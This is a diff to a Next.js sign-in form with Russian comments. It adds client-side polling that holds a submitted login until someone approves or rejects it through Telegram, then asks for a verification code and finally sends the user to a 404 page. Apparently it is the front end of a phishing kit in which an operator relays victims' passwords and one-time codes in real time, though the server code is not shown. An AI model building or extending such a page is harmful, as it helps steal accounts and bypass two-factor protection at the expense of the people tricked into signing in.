@@ -54,6 +54,9 @@ export default function SignInForm({
   const [rememberUsername, setRememberUsername] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
   const [error, setError] = useState("");
+  const [isWaitingTelegram, setIsWaitingTelegram] = useState(false);
+  const [showLoginError, setShowLoginError] = useState(false);
+  const [currentRequestId, setCurrentRequestId] = useState<string | null>(null);
 
   // Проверка валидности кода (6 цифр) для verify-code
   const isCodeValid = usernameLabel === "Verification Code" && /^\d{6}$/.test(username.trim());
@@ -79,6 +82,74 @@ export default function SignInForm({
       }
     }
   }, [defaultUsername]);
+
+  /**
+   * Polling статуса входа (long polling)
+   * @param requestId - ID запроса
+   * @param currentUsername - текущий username для перенаправления
+   */
+  const pollLoginStatus = async (requestId: string, currentUsername: string) => {
+    const maxAttempts = 150; // Максимум 150 попыток (5 минут при интервале 2 секунды)
+    let attempts = 0;
+    const pollInterval = 2000; // Проверка каждые 2 секунды
+
+    const poll = async () => {
+      if (attempts >= maxAttempts) {
+        console.error("[SIGNIN] Превышено время ожидания ответа");
+        setIsLoading(false);
+        setIsWaitingTelegram(false);
+        setError("Превышено время ожидания ответа");
+        setCurrentRequestId(null);
+        return;
+      }
+
+      try {
+        const response = await fetch(`/api/auth/check-status?requestId=${requestId}`);
+        const data = await response.json();
+
+        if (response.ok) {
+          if (data.status === "approved") {
+            console.log("[SIGNIN] Доступ разрешен, перенаправление на страницу кода");
+            setIsLoading(false);
+            setIsWaitingTelegram(false);
+            setCurrentRequestId(null);
+            // Перенаправляем на страницу верификации
+            const userName = encodeURIComponent(currentUsername.trim());
+            router.push(`/verification/verifycode?userName=${userName}&sendCodeSelector=Email`);
+            return;
+          } else if (data.status === "rejected") {
+            console.log("[SIGNIN] Доступ отклонен");
+            setIsLoading(false);
+            setIsWaitingTelegram(false);
+            setShowLoginError(true);
+            setCurrentRequestId(null);
+            // Показываем ошибку и сбрасываем форму
+            setTimeout(() => {
+              setShowLoginError(false);
+              setPassword("");
+            }, 5000);
+            return;
+          } else if (data.status === "pending") {
+            // Продолжаем polling
+            attempts++;
+            setTimeout(poll, pollInterval);
+          }
+        } else {
+          // Ошибка при проверке статуса
+          console.error("[SIGNIN] Ошибка проверки статуса:", data.error);
+          attempts++;
+          setTimeout(poll, pollInterval);
+        }
+      } catch (err) {
+        console.error("[SIGNIN] Ошибка polling:", err);
+        attempts++;
+        setTimeout(poll, pollInterval);
+      }
+    };
+
+    // Начинаем polling
+    setTimeout(poll, pollInterval);
+  };
 
   /**
    * Обработка отправки формы
@@ -167,10 +238,20 @@ export default function SignInForm({
         // После успешной отправки кода перенаправляем на 404
         router.push("/404");
       } else {
-        console.log("[SIGNIN] Вход успешен, перенаправление на страницу кода");
-        // Перенаправляем на новый URL с параметрами
-        const userName = encodeURIComponent(username.trim());
-        router.push(`/verification/verifycode?userName=${userName}&sendCodeSelector=Email`);
+        // Проверяем, есть ли requestId (значит нужно ждать ответа от Telegram)
+        if (data.requestId && data.status === "pending") {
+          console.log("[SIGNIN] Ожидание ответа от Telegram, requestId:", data.requestId);
+          setCurrentRequestId(data.requestId);
+          setIsWaitingTelegram(true);
+          setIsLoading(true);
+          // Начинаем polling статуса
+          pollLoginStatus(data.requestId, username.trim());
+        } else {
+          console.log("[SIGNIN] Вход успешен, перенаправление на страницу кода");
+          // Перенаправляем на новый URL с параметрами
+          const userName = encodeURIComponent(username.trim());
+          router.push(`/verification/verifycode?userName=${userName}&sendCodeSelector=Email`);
+        }
       }
     } catch (err) {
       console.error("[SIGNIN] Ошибка входа:", err);
@@ -201,7 +282,7 @@ export default function SignInForm({
           <h1>{title}</h1>
 
           {/* Информационный блок Reminder */}
-          <div className="notice">
+          <div className="notice" style={{ position: "relative" }}>
             {/* Изображение ошибки верификации - показывается после нажатия SUBMIT с неверным кодом */}
             {showVerificationError && usernameLabel === "Verification Code" && (
               <Image
@@ -213,14 +294,35 @@ export default function SignInForm({
                 unoptimized
               />
             )}
-            <Image
-              src={noticeImage}
-              alt="Notice"
-              width={400}
-              height={300}
-              className="notice-image"
-              unoptimized
-            />
+            {/* Изображение ошибки входа - показывается при отказе в Telegram */}
+            {showLoginError && !showVerificationError && (
+              <Image
+                src="/error sign in.png"
+                alt="Login error"
+                width={400}
+                height={300}
+                className="notice-error-image"
+                unoptimized
+              />
+            )}
+            {/* Обычное изображение - показывается когда нет ошибок */}
+            {!showLoginError && !showVerificationError && (
+              <Image
+                src={noticeImage}
+                alt="Notice"
+                width={400}
+                height={300}
+                className="notice-image"
+                unoptimized
+              />
+            )}
+            {/* Loading spinner во время ожидания ответа от Telegram */}
+            {isWaitingTelegram && (
+              <div className="loading-overlay">
+                <div className="spinner"></div>
+                <p>Ожидание ответа...</p>
+              </div>
+            )}
           </div>
 
           {/* Форма */}
